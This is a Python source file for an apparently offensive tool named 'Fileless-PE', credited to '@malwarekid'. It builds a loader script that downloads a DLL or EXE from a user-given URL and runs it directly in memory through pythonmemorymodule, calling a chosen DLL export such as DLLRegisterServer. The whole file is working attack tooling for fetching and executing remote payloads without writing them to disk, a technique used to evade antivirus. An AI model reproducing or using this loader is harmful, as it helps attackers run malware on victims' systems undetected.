import urllib.request
import sys

def generate_code(url, method, file_type, output_file="PEloader.py"):
    code = f'''
import urllib.request
import pythonmemorymodule

def load_dll_or_exe_from_url(url, file_type, method=None):
    request = urllib.request.Request(url)
    result = urllib.request.urlopen(request)
    buf = result.read()

    if file_type == 'dll':
        dll = pythonmemorymodule.MemoryModule(data=buf, debug=True)
        if method:
            startDll = dll.get_proc_addr(method)
            assert startDll(), f"Failed to execute '{{method}}' procedure"
    elif file_type == 'exe':
        exe = pythonmemorymodule.MemoryModule(data=buf, debug=True)
    else:
        print(f"Unknown file type: {{file_type}}")
        return

if __name__ == "__main__":
    load_dll_or_exe_from_url("{url}", "{file_type}", "{method}")
'''

    with open(output_file, 'w') as file:
        file.write(code)

    print("\033[0m"f'Code generated and saved to \033[31m{output_file}\033[0m')

if __name__ == "__main__":

    print("\033[38;2;255;69;172m" + r'''
    _______ __     __                     ____  ______
   / ____(_) /__  / /__  __________      / __ \/ ____/
  / /_  / / / _ \/ / _ \/ ___/ ___/_____/ /_/ / __/   
 / __/ / / /  __/ /  __(__  |__  )_____/ ____/ /___   
/_/   /_/_/\___/_/\___/____/____/     /_/   /_____/    
                                      By @malwarekid
''' + "\033[0m\033[32m")

    try:
        url = input("Enter the URL: ").strip()
        if not url:
            print("\033[31mError: URL cannot be empty.\033[0m")
            sys.exit(1)

        file_type = input('Enter the file type (\033[31mdll\033[0m or \033[31mexe\033[0m):\033[32m ').strip().lower()
        if not file_type:
            print("\033[31mError: File type cannot be empty.\033[0m")
            sys.exit(1)
        if file_type not in ['dll', 'exe']:
            print("\033[31mError: Invalid file type. Must be 'dll' or 'exe'.\033[0m")
            sys.exit(1)

        method = None
        if file_type == 'dll':
            method = input("Enter the method (Example Method: \033[0mDLLRegisterServer\033[32m): ").strip()
            if not method:
                print("\033[31mError: Method cannot be empty when file type is 'dll'.\033[0m")
                sys.exit(1)

        output_file = input("Enter the output file name (default: \033[31mPEloader.py\033[0m): ").strip()
        if not output_file:
            output_file = "PEloader.py"

        generate_code(url, method, file_type, output_file)

    except KeyboardInterrupt:
        print("\n\033[31mOperation cancelled by user.\033[0m")
        sys.exit(1)
